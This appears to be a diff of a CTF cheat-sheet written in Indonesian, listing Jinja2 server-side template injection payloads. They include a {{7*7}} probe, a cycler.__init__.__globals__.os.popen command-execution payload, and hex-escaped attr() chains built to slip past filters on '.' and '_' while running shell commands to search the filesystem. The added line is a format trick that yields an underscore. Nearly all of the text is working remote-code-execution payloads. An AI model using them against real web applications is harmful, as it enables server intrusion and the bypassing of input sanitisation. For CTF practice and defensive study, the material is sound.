@@ -22,6 +22,7 @@ icat -o 360448 disk.flag.img 1234
 1. {{7*7}} (cek ombak)
 2. {{ cycler.__init__.__globals__.os.popen('ls').read() }} (ls))
 
+1. {{'%c'|format(95)}} (artinya _)
 
 1. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }} (ls kalo . dan _ difilter)
 2. {{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('os')|attr('popen')('find / -type f | grep -i flag 2>/dev/null')|attr('read')() }}
